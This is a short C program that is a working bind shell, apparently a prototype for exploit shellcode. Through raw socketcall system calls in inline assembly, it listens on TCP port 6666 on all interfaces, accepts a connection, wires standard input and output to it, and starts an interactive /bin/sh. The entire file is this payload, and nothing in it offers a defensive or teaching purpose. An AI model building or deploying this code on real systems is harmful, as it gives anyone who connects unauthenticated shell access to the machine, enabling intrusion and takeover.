#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
int socketcall(int num, unsigned long* param)
{
    int ret;
    asm(    "push %%eax\n\t"
            "push %%ebx\n\t"
            "push %%ecx\n\t"
            "mov $0x66, %%eax\n\t"
            "mov %1, %%ebx\n\t"
            "mov %2, %%ecx\n\t"
            "int $0x80\n\t"
            "mov %%eax, %0\n\t"
            "pop %%ecx\n\t"
            "pop %%ebx\n\t"
            "pop %%eax\n\t"
            : "=g" (ret)
            : "g" (num), "g" (param)
            : "%eax", "%ebx", "%ecx"
       );
    return ret;
}
int main()
{
    unsigned long socket_param[] = {2, 1, 6};
    unsigned long bind_param[] = {0, 0, 16};
    unsigned long listen_param[] = {0, 1};
    unsigned long accept_param[] = {0, 0, 0};
    int soc;
    char serv_addr[16] = {
        2, 0, //AF_INET
        0x1a, 0xa, // port htons(6666)
        0, 0, 0, 0, // ADDR_ANY
        0, 0, 0, 0, 0, 0, 0, 0
    };

    // soc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    soc = socketcall(1, socket_param);

    // bind(soc, &serv_addr, sizeof(serv_addr));
    bind_param[0] = soc;
    bind_param[1] = (unsigned long)&serv_addr;
    socketcall(2, bind_param);

    //listen(soc, 1);
    listen_param[0] = soc;
    socketcall(4, listen_param);

    //soc = accept(soc, NULL, NULL);
    accept_param[0] = soc;
    soc = socketcall(5, accept_param);

    dup2(soc, 0);
    dup2(soc, 1);
    dup2(soc, 2);

    execl("/bin/sh", "/bin/sh", "-i", NULL);
}
